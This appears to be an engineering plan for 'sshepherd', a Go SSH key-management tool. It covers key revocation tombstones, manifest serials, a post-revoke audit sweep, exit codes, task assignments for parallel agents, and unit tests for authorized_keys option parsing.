- New `--reason TEXT` flag on revoke and rotate (optional; default empty). The date comes from the injected clock (`rotateNow()` pattern, `rotate.go:74`) so goldens stay stable.
- D1b: `planRevokeKeys` with an unowned fingerprint appends a tombstone instead of the error at `revoke.go:176`. The affected set is empty, so this is `saveOnly` (`editrun.go:209-213`) followed by the sweep. A fingerprint that is already tombstoned is a no-op with a note and no save.
- `defaultSaveNote` (`editrun.go:168`) becomes: `…; apply from an older copy is refused on the servers this edit wrote (serial N)`.

**4. Consumers honour tombstones (D1, D2, D2a, D1a).**
- `adopt.Build` (`adopt.go:76-104`): before `OwnerOf`, `if t, ok := cfg.Revoked(k.Fingerprint); ok { warn "key %s on %s is REVOKED (%s, %s) — not adopted; run 'sshepherd apply --server %s' to remove it"; continue }`. Before an extension, `if cfg.AccessRevoked(owner.Name, srv) { warn …; continue }`, mirroring the `ExceptCarveOut` branch at `:78-83`.
- `reconcile.users`/`knownKey` (`reconcile.go:183-251`): the same two checks. A tombstoned incoming `.pub` is skipped with a warning, and a D1a pair is never extended. Fresh `import` (no `--merge`) has no manifest and is unchanged.
- `audit`: `criticalDrift` (`report.go:257-268`) also returns true for any `Diff.Unauthorized` key with `cfg.Revoked`. The text row becomes `‼ alice (REVOKED 2026-11-08)  SHA256:…  installed but REVOKED (CRITICAL: revoked key)`. In JSON, `jsonKey` (`json.go:79-95`) gains an additive optional `revoked: {user, date, reason}`, the server status becomes `critical`, and `summary.revoked_keys` (omitempty) is added. Schema stays 1. A D4a serial note adds `manifest_serial_ahead: S` (omitempty) and drift status.
- **D5:** delete the wildcard compaction at `adopt.go:180-184`, the `Wildcard` field (`:24`) and both renderer branches (`cmd/sshepherd/adopt.go:57-60`, `:100-103`). There is no `--wildcard` flag (D5 option 1).
- **Regenerate-mode adopt** must round-trip `serial` and `revoked` through `manifestOut` (`manifest_out.go:41-45`), or a plain `adopt` would erase all revocation memory. This gets a dedicated test.

**5. Post-revoke sweep (D3: opt-in `--sweep`).**
- Without `--sweep`, revoke and rotate print the exact follow-up: `check every server: sshepherd audit --config <path> [--known-hosts …] [--identity …]` (the run's own flags, P06's helper). D2 makes that audit exit 2 while the key is installed anywhere.
- New `cmd/sshepherd/sweep.go`, run only with `--sweep`. It runs after `finishEdit` on a **confirmed** run (`stageConfirmed`) and after a `saveOnly` that added a tombstone. It is skipped under `--dry-run` and `--no-apply` (contacts no server by contract), and in those cases the audit command above is printed.
- It reuses the run's known_hosts, credentials and `--parallel`, and calls `audit.Run` over **every manifest server not already verified by this run's writes**. It keeps only `Diff.Unauthorized` keys whose fingerprint is in this run's new tombstones.
- **`authorized_keys2` too (review panel, security-writepath):** audit only probes keys2 with `[ -s ]` (`internal/sshconn/sshconn.go:83-85`). The sweep additionally reads its contents (`cat`, on the default or equivalent path, only during the sweep) and matches tombstoned fingerprints there, reported as `REVOKED KEY STILL INSTALLED (authorized_keys2)`. A keys2 that exists but cannot be read gives `cannot prove removal on db-2 (authorized_keys2 unreadable)` and exit 1, never 0.
- Output: `REVOKED KEY STILL INSTALLED: alice SHA256:… on db-2, db-7 — run 'sshepherd apply --server db-2 --server db-7'`. A sole-grantee server (emptied) is listed with its own wording: `remove it by hand or grant another user there first` (no wipe mode, which is on hold).
- Exit code precedence for revoke/rotate with `--sweep`: tool error 3 > sweep found the key 2 (if D28 = exit 2 means "act now on security") > not converged, sweep unreachable or keys2 unreadable 1 > 0.
- JSON: the edit document gains `sweep: {checked, still_installed: [{server, fingerprint, user, file}], unreachable: [..], unprovable: [..]}` (additive). The revoke/rotate `--json` contract ("a document only on exit 0 or 1") widens to 0, 1 or 2, the same widening P08 makes for apply.
- `printScope` (`editrun.go:383-386`) is replaced on swept runs by `swept N of M servers: …`.

**6. Exit-code changes the spec must state (rows of the one shared table that D28 fixes).**
- `audit`: a tombstoned key installed → **2** (was 1). A D29 policy conflict → **2**. A forged header serial → **2**. A server serial ahead of the manifest (within the bound) → 1 (new note).
- `revoke`/`rotate --sweep`: the sweep finds the key → **2**. The README sentence "apply, revoke and rotate never return 2" (README.md:1342-1350) is rewritten once from the shared table, together with P08/D10.
- `revoke USER` already revoked (D1c) → **0**.
- `apply`/`revoke`/`rotate`: a stale-serial refusal → 1 (an ordinary refused plan, `plan.go:595-603`); a D29 conflict on a server → 1 (refused server).
- `validate` and manifest-saving commands: a D29 conflict → **3**.

#### What the spec doc must decide or record (checklist for the author)

1. The answers to D28, D1, D29, D2, D3, D4, D4b, D5, D1a, D1b, D1c, D2a, D4a, D4c, D1d and D1e, each with its date.
2. The YAML schema and the validation messages, verbatim (they become test expectations).
3. The header wording for serial > 0, the exact regexp, and the "serial 0 = legacy bytes" rule.
4. The convergence/refusal table above, and that `Affected` ignores the header.
5. Placement: where `serial:` and `revoked:` go in a file that lacks them, and that comments are preserved.
6. The text and JSON shapes for audit's REVOKED row, `revoked` key field, `revoked_keys`, `manifest_serial_ahead`, and the revoke/rotate `sweep` object (schema stays 1, additive).
7. The exit-code rows for the shared table (D28), including that the revoke/rotate `--json` contract widens to exit 0, 1 or 2.
8. Interactions with on-hold items: no `apply --force` (the serial has no override), no `prune` (the sweep only reads, and D1b writes no server), no wipe mode (an emptied server stays a by-hand fix). Each is stated explicitly.
9. Threat notes: a hostile server can claim a huge serial. Above M + 1000 it counts as forged (audit exit 2, apply proceeds), and below that a removal-only plan still proceeds, so no header can stop an emergency revoke of the attacker's own key. Tombstone `reason` text is printed, so it is sanitized.
10. Amends: the apply spec (header decision, `2026-07-19-apply-slice-design.md:76`), the revoke/rotate spec decision 5 (`2026-10-23-revoke-rotate-design.md:285-295`), the adopt spec (wildcard line 124) and the adopt-merge spec.

#### Implementation outline (after owner approval; a writing-plans plan in the `2026-11-07-apply-json.md` format follows)

Use W4 as two sub-waves so that agents own disjoint files. Each agent works in a git worktree and does not commit. One integrator commits. File paths below are as of `adee207`; the W4 plan re-targets them to P14's `internal/fleet`/`internal/workflow` layout (written after W3 lands).

**W4a — schema and render (2 agents in parallel) plus a failing-first E2E lane**

| Agent | Files (exclusive) | Failing tests first |
|---|---|---|
| A: schema | `internal/config/config.go`, `internal/config/revoked.go` (new), `internal/config/revoked_test.go` (new), `internal/config/fuzz_test.go` (seed tombstone/serial docs), `internal/manifest/manifest.go`, `internal/manifest/edit.go`, `internal/manifest/edit_test.go`, `internal/manifest/fuzz_edit_test.go` | `TestRevokedRejectsOwnedKey` (a user lists a tombstoned fp → error containing `is revoked`), `TestRevokedFingerprintShape`, `TestAccessTombstoneConflictsExplicitGrant`, `TestSerialNegativeRejected`, `TestLoadAllowsSerialAndRevoked` (manifest.Load no longer `UnsupportedError`), `TestBumpSerialCreatesFirstKey` (golden of encoded bytes), `TestAddTombstonesPreservesComments`, `TestConflictsAreReportedNotFatal` (D29: a listed tombstoned fp parses, `Conflicts()` names it) |
| B: header | `internal/authkeys/render.go`, `internal/authkeys/render_test.go`, `internal/authkeys/header.go` (new), `internal/authkeys/header_test.go` (new), `internal/authkeys/fuzz_test.go` (+`FuzzParseHeader`), `internal/sshwrite/sshwrite.go` (prefix test only), `internal/sshwrite/sshwrite_test.go` | `TestRenderSerialZeroIsLegacyBytes` (`bytes.HasPrefix(out, []byte(ManagedHeader+"\n"))` for serial 0), `TestRenderSerialHeader`, `TestParseHeader` table (legacy → (0,true); `(serial 7)` → (7,true); `(serial 07)`, `(serial -1)`, trailing space, 17 digits → (0,false)), `FuzzParseHeader` (never panics; `ParseHeader(header(Render(nil,n)))==n`), and an sshwrite script test that a file headed `…(serial 9)…` takes no `.orig` |

| F: E2E (failing first) | `cmd/sshepherd/e2e_test.go` | `TestE2ERevokeNoResurrect`, `TestE2EStaleManifestRefused`, `TestE2EStaleManifestAfterHandEdit` (D4b) — written against the **post-W3 tree** and run there, where all three must FAIL (re-adopted key; stale apply re-grants). The "unreachable during revoke" server is simulated with a manifest copy that points it at a reserved closed port (`net.Listen` then `Close`) for the revoke, and the real port for the later `adopt --merge`; no container is stopped. |

Commands: `GOTOOLCHAIN=go1.27.3 go test -race ./internal/config/... ./internal/manifest/... ./internal/authkeys/... ./internal/sshwrite/...`, first fail, then pass. Also `go test -run='^$' -fuzz=FuzzParseHeader -fuzztime=30s ./internal/authkeys`. No Makefile edit: `make fuzz` discovers `FuzzParseHeader` (P13).

**W4b — consumers (3 agents in parallel, against the merged W4a API)**

| Agent | Files (exclusive) | Failing tests first |
|---|---|---|
| C: pure consumers | `internal/adopt/adopt.go`, `internal/adopt/adopt_test.go`, `internal/reconcile/reconcile.go`, `internal/reconcile/reconcile_test.go`, `internal/apply/plan.go`, `internal/apply/plan_test.go`, `internal/apply/affected.go`, `internal/apply/affected_test.go` | `TestBuildSkipsRevokedKey` (Unauthorized fp in tombstones → no NewUser, no Extension, warning contains `REVOKED`), `TestBuildHonoursAccessTombstone`, `TestBuildNeverWildcards` (3 servers, key on all → `FoundOn` == all three, no `*`), `TestReconcileSkipsRevokedPub`, `TestPlanRefusesNewerServerSerial`, `TestPlanRemovalOnlyProceedsOnNewerSerial`, `TestPlanForgedSerialTreatedAsNone`, `TestPlanConvergedOnOlderSerialSameBody`, `TestAffectedIgnoresSerialBump`, `TestPlanSkipsConflictingKey` (D29) |
| D: audit | `internal/audit/report.go`, `internal/audit/json.go`, `internal/audit/report_test.go`, `internal/audit/json_test.go`, `internal/audit/testdata/report_revoked*.golden(.json)` (new), `internal/audit/testdata/report_serial_ahead*.golden(.json)` (new) | `TestExitCodeRevokedKeyIsCritical` (→2), `TestStatusSerialAheadIsDrift` (→1), `TestForgedSerialIsCritical` (→2), `TestPolicyConflictIsCritical` (→2), plus goldens (generated with `-update`, then read back by eye) |
| E: cmd | `cmd/sshepherd/revoke.go`, `rotate.go`, `editrun.go`, `sweep.go` (new), `sweep_test.go` (new), `adopt.go`, `manifest_out.go`, `revoke_test.go`, `rotate_test.go`, `adopt_test.go`, `manifest_out_test.go`, `testdata/adopt_*.golden` | `TestRevokeWritesTombstoneAndBumpsSerial` (saved bytes golden), `TestRevokeUnownedKeyRecordsTombstone` (D1b), `TestRotateTombstonesOldKey`, `TestRevokeSweepFindsStrayExit2` (hermetic `sshtest` fleet, `--sweep`: alice granted on web-1, hand copy on web-2 → exit 2, stdout `REVOKED KEY STILL INSTALLED`), `TestRevokeSweepFindsKeyInKeys2` (alice's key only in web-2's `authorized_keys2` → exit 2), `TestRevokeWithoutSweepPrintsAuditCommand`, `TestRevokeAlreadyRevokedExits0` (D1c), `TestApplyBumpsSerialOnHandRemoval` (D4b), `TestSweepSkippedOnDryRunAndNoApply`, `TestAdoptRegenerateKeepsRevokedAndSerial`, `TestAdoptMergeNoWildcard` |

**Integrator (W4):** merges W4a (A, B, F) then W4b (C, D, E). Lane F's E2E tests (`TestE2ERevokeNoResurrect`: adopt → apply → `revoke alice` with one server pointed at a closed port → `adopt --merge` with the real port → alice's fingerprint absent from `users:` and the warning names it → `audit` exits 2 → `apply --server <it>` → `audit` exits 0; `TestE2EStaleManifestRefused`: copy the manifest → revoke → `apply --yes --config <old copy>` → exit 1 with the serial refusal, server bytes unchanged; `TestE2EStaleManifestAfterHandEdit`) must go from FAIL (recorded by lane F) to PASS. The integration matrix (`internal/sshwrite/integration_test.go`) gets a serial-header `.orig` case. The integrator updates the README sections listed below and the CLAUDE.md Status, runs `make check` and `make integration`, and commits. Then an independent verifier and a repair pass.

**README updates (same commit):** Quick start §4 (README.md:182-194: tombstone + sweep), The manifest (new `### Revoked keys` and `### Serial` after `### Comment policy`, :305), Validation rules (:274), audit (:325: REVOKED row and JSON fields, copied from the new goldens), adopt (:517: no wildcard, revoked keys skipped), import `--merge` (:460), apply (:549: header serial, stale refusal), revoke (:769: tombstones, `--reason`, unowned `--key`, sweep, limitations :997-1000), rotate (:1033), Exit codes (:1340-1350, rewritten from the shared D28 table), Safety model (:1352).

#### Risks and how to verify

- **Header churn:** `serial 0` must render the legacy bytes. Pin this with `TestRenderSerialZeroIsLegacyBytes` and the existing apply goldens staying unchanged.
- **Scope blow-up:** a serial in the header would make every server "affected". Pin `TestAffectedIgnoresSerialBump`.
- **Silent memory loss:** regenerate-mode adopt dropping `revoked:`. Pin with `TestAdoptRegenerateKeepsRevokedAndSerial` and the E2E test.
- **`.orig` regression:** the exact-match shell test at `sshwrite.go:206` would take a fresh `.orig` of every serial-headed file. Pin with the script unit test and the integration case.
- **Monitoring change:** audit exit 1 → 2 for a revoked key or a policy conflict, and `revoke --sweep` can return 2. Call this out in the README exit-code table and the CLAUDE.md Status.
- **A manifest that loads today gets new conflicts:** D29 keeps it loading; audit reports the conflict instead of exiting 3.

#### Acceptance

- The spec file exists at `docs/superpowers/specs/2026-11-08-revocation-memory-design.md` with Status `Draft — awaiting owner decisions` and every item in the checklist above.
- Each of D28, D1, D29, D2, D3, D4, D4b, D5, D1a, D1b, D1c, D2a, D4a, D4c, D1d and D1e is answered by the owner, one at a time, and recorded in the spec with its date. The spec is approved before the W4 plan is written, and that plan is written after W3 (P14) lands.
- `git status --porcelain` shows only the new spec file. This package changes no code, tests, README or CLAUDE.md.
- After implementation (W4): `make check`, `make integration`, `make fuzz-list | grep -q FuzzParseHeader`, `make fuzz`, and `GOTOOLCHAIN=go1.27.3 go test -race -run 'TestE2ERevokeNoResurrect|TestE2EStaleManifestRefused|TestE2EStaleManifestAfterHandEdit' -tags integration ./cmd/sshepherd` all pass.

#### Out of scope

- `prune` (any fleet-wide deletion of unowned keys), `apply --force` (or any serial override flag; editing `serial:` by hand is not a flag), wipe/empty-server mode, key generation and scheduled rotation, `move-key`, and `import --prefer`. All are on hold. The sweep only reads, D1b writes no server, and the serial has no override.
- Import's wildcard compaction (`import.go:100-106`, `reconcile.go:307-311`), which comes from local ssh config rather than remote content. It could be a later question to the owner but is not covered by D5.
- Content hashes or signatures for the manifest, and server-side enforcement (agentless design).
- Labelling plain `apply` remove rows as `(REVOKED)` in `internal/apply/report.go`. That is a nice-to-have follow-up after P07's renderer work, not part of this spec.

---

**Summary.** P04 is a spec-only package, and its only file is the new `docs/superpowers/specs/2026-11-08-revocation-memory-design.md`. It proposes a `revoked:` tombstone list (key and access entries), a manifest `serial:` rendered into the header (legacy bytes at serial 0, excluded from `Affected` and convergence, newer server serial → refusal except for removal-only plans, absurd serials treated as forged, hand removals bump it), an opt-in read-only post-revoke sweep that also reads `authorized_keys2`, idempotent revoke, policy conflicts reported rather than fatal, and no adopt wildcard. It outlines a two-sub-wave W4 implementation with disjoint agents and a failing-first E2E lane.

**Conflicts and ordering.**
1. The spec has no file conflicts in wave 0.
2. The implementation touches files owned by:
   - P05: `internal/config/config.go`, `internal/adopt/adopt.go`, `internal/apply/plan.go`.
   - P06: `cmd/sshepherd/{adopt,editrun,revoke,rotate,import}.go`.
   - P07: `internal/audit/{report,json}.go` and goldens.
   - P11: `internal/sshwrite/sshwrite.go`, `internal/apply/plan.go`.
   - P12: `internal/manifest/manifest.go`, `cmd/sshepherd/manifest_out.go`, adopt/revoke goldens.
   - P13: the Makefile `fuzz:` list.

   It therefore runs as W4, after P14 (W3) has moved `editrun.go`, `revoke.go`, `rotate.go` and `apply/plan.go`; its plan is written against that layout.
3. Revoke/rotate returning exit 2 (`--sweep`) and P08/D10 (apply exit 2 for `lockout_unrestored`) both come from the one exit-code table D28 fixes. The first implementation wave that lands an exit-2 row (W4) rewrites README:1340-1350 from that table.
4. `manifest.checkTopLevelKeys` must accept `serial`/`revoked`. If P12's new `internal/manifest/store.go` adds its own schema gate, it must also leave room for these keys.

---

## Wave 1 — key options, CLI messages, reports, and two specs

**Starts:** after W0 is committed (P06 needs P01's help goldens and its `run.go`/`import.go` edits). **Decisions needed:** D27, asked **before W1 starts** so the P05 agent writes only one version of its tests (P05 Task 2 carries the complete diff for either answer; no follow-up commit).
**Packages:** P05, P06, P07 (fix) and P08, P09 (spec). 27 findings (16 fixed, 11 specced; ARC-3's behavior half also lands here as P07 Task 7). P10 moved to after W4 (review panel, product-ux). Two rounds: round 2 is one small lane that needs P05, P06 and P07 committed.

| Round | Lane | Package / tasks | Files (exclusive in that round) | `make integration` |
|---|---|---|---|---|
| 1 | P05-A | Tasks 1–5 (Task 1 first) | `internal/authkeys/options.go` (new), `options_test.go` (new), `internal/config/config.go`, `config_test.go`, `internal/apply/plan.go`, `plan_test.go`, `internal/adopt/adopt.go`, `adopt_test.go`, `cmd/sshepherd/keyarg.go`, `keyarg_test.go`, `cmd/sshepherd/adopt_options_test.go` (new) | no |
| 1 | P05-B | Tasks 6–7 | `internal/sshcfg/sshcfg.go`, `sshcfg_test.go`, `sshg_diff_test.go` (new) | no |
| 1 | P06 | Tasks 1–9 incl. 7b (one agent, in order) | `cmd/sshepherd/{apply,audit,adopt,editrun,revoke,rotate,run,import,paths,edit}.go`, `fleet.go` (new), their `_test.go` files, `fleet_test.go` (new), `rotate_keep_old_test.go`, `revoke_server_test.go`, `testdata/help/*.golden`, `internal/apply/edit.go`, `edit_test.go`, `testdata/edit_*.golden` | no |
| 1 | P07 | Tasks 1–8 (one agent; optional split B → A ∥ C → Task 6; Tasks 7–8 after Task 5) | `internal/apply/{report,json}.go` + tests + `plan_*`/`json_*`/`summary_*` goldens, `internal/audit/{audit,report,json,errors}.go` + tests + `testdata/*`, `drift_classes_test.go`, `internal/sshconn/{connect,errors}.go`, `connect_test.go`; Task 4: `hostkey.go`, `sshconn_test.go`, `internal/sshread/integration_test.go`; Task 7: `internal/sshwrite/sshwrite_test.go` (one appended test); `cmd/sshepherd/json_cmd_test.go`, `audit_hermetic_test.go` | Task 4 only |
| 1 | P08 | spec only (`kind: 'spec'`) | `docs/superpowers/specs/2026-11-08-write-failure-semantics-design.md` (new) | no |
| 1 | P09 | spec only (`kind: 'spec'`) | `docs/superpowers/specs/2026-11-08-audit-trust-posture-design.md` (new) | no |
| 2 | P07-F1 | F-P07-1 (below) | `internal/adopt/adopt.go`, `adopt_test.go`, `cmd/sshepherd/adopt.go`, `adopt_test.go` | no |

**Merge order and commits:** round 1: P05 (A → B) → P07 → P06 → P08 → P09, one commit per package. Round 2 (worktree at the round-1 `baseSha`): P07-F1.

### F-P07-1 (lane P07-F1, W1 round 2): adopt shows the dial hint once

> **Moved here from W2 by the review panel (completeness).** P07 moves the hint out of the error text, so adopt's `Issue.Detail` (built from `r.Err.Error()` at `internal/adopt/adopt.go:70`) loses it. Fixing it in the same wave keeps master free of that regression across a push. It is a W1 hand-off, not a new finding ID.

**Files:** `internal/adopt/adopt.go`, `internal/adopt/adopt_test.go`, `cmd/sshepherd/adopt.go` (`reportUnreadable`), `cmd/sshepherd/adopt_test.go`.

- [ ] **Step 1: Failing tests.** In `internal/adopt/adopt_test.go`, add `TestBuildKeepsHint`: one `audit.ServerResult` whose `Err` is a `*sshconn.Error{Kind: audit.ErrorKindDial, Err: errors.New("dial tcp 127.0.0.1:1: connect: connection refused"), Hint: sshconn.DialHint}`. Assert `p.Issues[0].Hint == audit.CleanHint(err)` and that `p.Issues[0].Detail` does not contain `DialHint`. In `cmd/sshepherd/adopt_test.go`, add `TestAdoptPartialPrintsHintOnce`: a manifest with two servers on closed local ports (reserve each with `net.Listen("tcp", "127.0.0.1:0")`, then `Close`), run `adopt --partial`, and assert stderr has exactly one `hint:` line and both server names.
- [ ] **Step 2: Run, expect FAIL** (`p.Issues[0].Hint undefined`): `go test ./internal/adopt/ -run TestBuildKeepsHint` and `rtk proxy go test ./cmd/sshepherd/ -run TestAdoptPartialPrintsHintOnce`.
- [ ] **Step 3: Implement.** `type Issue struct { Server, Detail, Hint string }`; in `Build`, `Issue{Server: r.Server.Name, Detail: r.Err.Error(), Hint: audit.CleanHint(r.Err)}`. In `reportUnreadable` (`cmd/sshepherd/adopt.go`), log each distinct non-empty `Hint` once after the issue lines (`hint: …`), deduplicated the same way `audit.Hints` does for text reports.
- [ ] **Step 4: Run, expect PASS**, then `make check`.

**Integrator hand-offs (W1):**
- **P07 breaks a P06 test:** `cmd/sshepherd/apply_test.go:130` checks `"ERROR:"`; the output becomes `"ERROR [dial]:"`. Change that one line as a merge fix.
- **Same-wave contracts:** P07 keeps `apply.Plural` in `report.go` under that name (P06 uses it). P05 keeps the `read manifest:` and `parse manifest:` prefixes in `config.go` (P06's `manifestError` keys on them). P05 keeps `optionIssue`, `hasRestrictiveOption`, `certOnly`, `expiryOption` and `expiryPassed` by name. P05 adds `RewriteRow.Widens []string` exactly (P07 Task 8 codes against it).
- **Shared test helpers:** `adopt_options_test.go` (P05) reuses `hermeticFleet`/`shortHome` (P07's `audit_hermetic_test.go`) and `run`/`writeConfig` (P06). If either renames them, fix the call sites.
- **Spec amendments (P07):** one paragraph each in `docs/superpowers/specs/2026-07-16-audit-json-exit-codes-design.md`, `2026-11-07-apply-json-design.md` (the `hint` field, write-phase `error_kind`, and the new `widens` field) and `2026-07-06-audit-slice-design.md:247` (`hint` field, the `(unknown)` label).
- **D18:** if answered by now, apply the README narrowing from P09 (README:37, 268-272; CLAUDE.md Core capabilities → Audit).
- **After the specs land:** the main session asks Block 3 (D9 → D9b → D10), then Block 4 (D14 → D19), one at a time, while W2 and W3 run. None of them blocks W2.

**Wave exit:** `make check`, `make integration`, every regenerated golden read by eye, README samples re-copied from goldens; verifier and repair.

### P05 — One key-option model in authkeys; adopt survives odd server lines; sshcfg Include cycles

> **Program notes (master plan, revised):** The owner question in Task 2 is **D27**, asked before W1 starts. The `RewriteRow.Widens` rendering (H1) is P07 Task 8; P05 only adds the field. `FuzzCheckOption` is picked up by P13's discovered fuzz list.

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this package task by task. Steps use checkbox (`- [ ]`) syntax. **No commits.** Leave the diff in your worktree; the wave-1 integrator applies it, runs `make check` + `make integration`, updates README/CLAUDE.md and commits once.

**Goal:** sshd's authorized_keys options get one meaning table in `internal/authkeys`. The manifest allow-list, apply's loosening highlight, the lockout-guard warning and rotate's expiry check all use that table. The table also fixes the FIDO misclassification (COR-4). adopt turns a server line that sshd would ignore into an Issue instead of a `bug:` exit 3 (COR-1/TST-2). sshcfg Include stops recursing forever (SEC-4). A differential test checks sshcfg against `ssh -G` (TST-10).

**Architecture:** New `internal/authkeys/options.go` holds an unexported `map[string]optionSpec` plus a small exported API (`CheckOption`, `OptionIssue`, `Loosening`, `BlocksLogin`, `CertOnly`, `FindOption`, `ExpiryTime`). `config`, `apply`, `adopt` and `cmd/sshepherd` become thin callers. `authkeys.ParseLine` **stays permissive** on purpose. If it rejected these lines, a typo on a server would make the whole file "unparseable", and apply would refuse to write that server. sshcfg's `include()` records the canonical file chain, a total read budget and a per-file size cap.

**Tech Stack:** Go 1.27, `golang.org/x/crypto/ssh`, `os/exec` (test files only; depguard's `non-test` rule already exempts `_test.go`), goleak, hermetic `sshtest` server.

| | |
|---|---|
| kind | fix |
| wave | 1 |
| depends_on | none (it builds on whatever wave 0 left in `sshtest`, through the existing `hermeticFleet` helper only) |
| parallel split inside P05 | **Stream A** (Tasks 1–5: authkeys → config/apply/keyarg/adopt) and **Stream B** (Tasks 6–7: sshcfg) share no files and can run as two agents in parallel. Inside Stream A, Task 1 must land first. Tasks 2–5 then touch disjoint files and can run in any order. |

#### Findings covered

| ID | Sev | One line |
|---|---|---|
| ARC-7 | LOW | Option meaning is string-matched in four places (`config.go:204-227`, `plan.go:543-553`, `plan.go:578-588`, `keyarg.go:268-297`). The fix is one table in authkeys. |
| COR-4 | LOW | `isRestriction` (`plan.go:543`) counts `no-touch-required` as a restriction and leaves out `verify-required`. Added relaxations are never flagged. |
| COR-1 | MED | A single `zzz <key>` or `from=1.2.3.4 <key>` line on any server makes adopt fail its own self-check (`cmd/sshepherd/adopt.go:305-306`): `bug: …` exits 3, and `--partial` cannot help. |
| TST-2 | MED | The server-side parse (`authkeys.go:44`) accepts unknown options, and no test covers that. The fix keeps the parse permissive and adds the check at adopt (see COR-1) plus read-side table tests. |
| SEC-4 | LOW | `include()` (`sshcfg.go:314-341`) has no cycle tracking. Two self-including fragments take 2^16 parses; three take 3^16, which hangs and runs out of memory. |
| TST-10 | LOW | Agreement with `ssh -G` is only claimed in comments (`sshcfg_test.go:320,342`). No test runs ssh. |

#### Files owned (exclusive in wave 1)

- `internal/authkeys/options.go` (new), `internal/authkeys/options_test.go` (new)
- `internal/config/config.go`, `internal/config/config_test.go`
- `internal/apply/plan.go`, `internal/apply/plan_test.go`
- `internal/adopt/adopt.go`, `internal/adopt/adopt_test.go`
- `cmd/sshepherd/keyarg.go`, `cmd/sshepherd/keyarg_test.go`, `cmd/sshepherd/adopt_options_test.go` (new)
- `internal/sshcfg/sshcfg.go`, `internal/sshcfg/sshcfg_test.go`, `internal/sshcfg/sshg_diff_test.go` (new)

Read but never edited: `internal/config/fuzz_test.go:91` (calls `optionIssue`, so that name **must survive**), `internal/apply/exec.go:137` (calls `hasRestrictiveOption`, so that name **must survive**), `cmd/sshepherd/rotate.go:166-168` (calls `expiryOption`/`expiryPassed`, so those signatures **must survive**), and `cmd/sshepherd/audit_hermetic_test.go` (`hermeticFleet`, `shortHome`) and `cmd/sshepherd/audit_test.go` (`writeConfig`), whose helpers are reused.

---

#### Task 1: The option table in `internal/authkeys` (Stream A, first)

**Files:** Create `internal/authkeys/options.go` and `internal/authkeys/options_test.go`.

- [ ] **Step 1: Write the failing tests** (`options_test.go`)

```go
package authkeys

import (
	"strings"
	"testing"
	"time"
)

func TestCheckOption(t *testing.T) {
	tests := []struct{ opt, want string }{
		{"no-pty", ""},
		{"No-PTY", ""}, // sshd matches names case-insensitively
		{`from="10.0.0.0/8,!10.0.0.1"`, ""},
		{"verify-required", ""},
		{"no-touch-required", ""},
		{"zzz", "is not a recognized authorized_keys option"},
		{"no-ptty", "is not a recognized authorized_keys option"}, // typo
		{"from=1.2.3.4", `requires a quoted value (name="...")`},
		{`no-pty="x"`, "does not take a value"},
		{"no-pty\x1b[31m", "contains control or format characters"},
		{`expiry-time="20270101"`, ""},
		{`expiry-time="202701011200Z"`, ""},
		{`expiry-time="2027"`, "has an invalid value (want YYYYMMDD[HHMM[SS]][Z])"},
		{`expiry-time="2027xx01"`, "has an invalid value (want YYYYMMDD[HHMM[SS]][Z])"},
	}
	for _, tt := range tests {
		if got := CheckOption(tt.opt); got != tt.want {
			t.Errorf("CheckOption(%q) = %q, want %q", tt.opt, got, tt.want)
		}
	}
}

func TestOptionIssue(t *testing.T) {
	if err := OptionIssue([]string{"restrict", `command="/bin/true"`}); err != nil {
		t.Errorf("clean options: err = %v", err)
	}
	err := OptionIssue([]string{"no-pty", "zzz", "no-ptty"})
	if err == nil || err.Error() != `option "zzz" is not a recognized authorized_keys option` {
		t.Errorf("err = %v, want the first bad option named", err)
	}
	// %q keeps remote control bytes out of the message.
	if err := OptionIssue([]string{"a\x1bb"}); err == nil || strings.ContainsRune(err.Error(), 0x1b) {
		t.Errorf("err = %q, want an escaped option", err)
	}
}

func TestLoosening(t *testing.T) {
	tests := []struct {
		name                    string
		actual, desired         []string
		wantDropped, wantWidens []string
	}{
		{"none on server", nil, []string{"no-pty"}, nil, nil},
		{"all dropped", []string{`from="10.0.0.5"`, `command="/x"`, "no-pty", "tty"}, nil,
			[]string{`from="10.0.0.5"`, `command="/x"`, "no-pty"}, nil},
		{"kept verbatim", []string{"restrict", `expiry-time="20270101"`}, []string{"restrict", `expiry-time="20270101"`}, nil, nil},
		{"changed value counts", []string{`from="10.0.0.5"`}, []string{`from="0.0.0.0/0"`}, []string{`from="10.0.0.5"`}, nil},
		{"forwarding and ca", []string{`permitopen="h:1"`, `permitlisten="2"`, "cert-authority", `principals="a"`}, nil,
			[]string{`permitopen="h:1"`, `permitlisten="2"`, "cert-authority", `principals="a"`}, nil},
		// COR-4
		{"verify-required dropped loosens", []string{"verify-required"}, nil, []string{"verify-required"}, nil},
		{"no-touch-required dropped tightens", []string{"no-touch-required"}, nil, nil, nil},
		{"no-touch-required added loosens", nil, []string{"no-touch-required"}, nil, []string{"no-touch-required"}},
		{"re-enabler added under restrict", []string{"restrict"}, []string{"restrict", "port-forwarding"}, nil, []string{"port-forwarding"}},
		{"re-enabler without restrict is a no-op", nil, []string{"pty"}, nil, nil},
		{"restrict newly added with pty", nil, []string{"restrict", "pty"}, nil, nil},
		{"restrict dropped", []string{"restrict", "pty"}, []string{"pty"}, []string{"restrict"}, nil},
		{"unknown server option not classified", []string{"no-ptty"}, nil, nil, nil},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			d, w := Loosening(tt.actual, tt.desired)
			if strings.Join(d, "|") != strings.Join(tt.wantDropped, "|") || strings.Join(w, "|") != strings.Join(tt.wantWidens, "|") {
				t.Errorf("Loosening = (%q, %q), want (%q, %q)", d, w, tt.wantDropped, tt.wantWidens)
			}
		})
	}
}

func TestBlocksLoginAndCertOnly(t *testing.T) {
	for _, o := range []string{"restrict", `from="1.2.3.4"`, `command="/bin/true"`, `expiry-time="20270101"`, `FROM="10.0.0.1"`} {
		if !BlocksLogin([]string{o}) {
			t.Errorf("BlocksLogin(%q) = false, want true", o)
		}
	}
	for _, o := range []string{"no-pty", "no-agent-forwarding", "verify-required", "no-ptty"} {
		if BlocksLogin([]string{o}) {
			t.Errorf("BlocksLogin(%q) = true, want false", o)
		}
	}
	if !CertOnly([]string{"cert-authority"}) || !CertOnly([]string{`Principals="a"`}) || CertOnly([]string{"restrict"}) {
		t.Error("CertOnly: want true for cert-authority/principals= only")
	}
}

func TestExpiryTime(t *testing.T) {
	got, err := ExpiryTime(`expiry-time="202701021504Z"`, time.Local)
	if err != nil || !got.Equal(time.Date(2027, 1, 2, 15, 4, 0, 0, time.UTC)) {
		t.Errorf("ExpiryTime = %v, %v", got, err)
	}
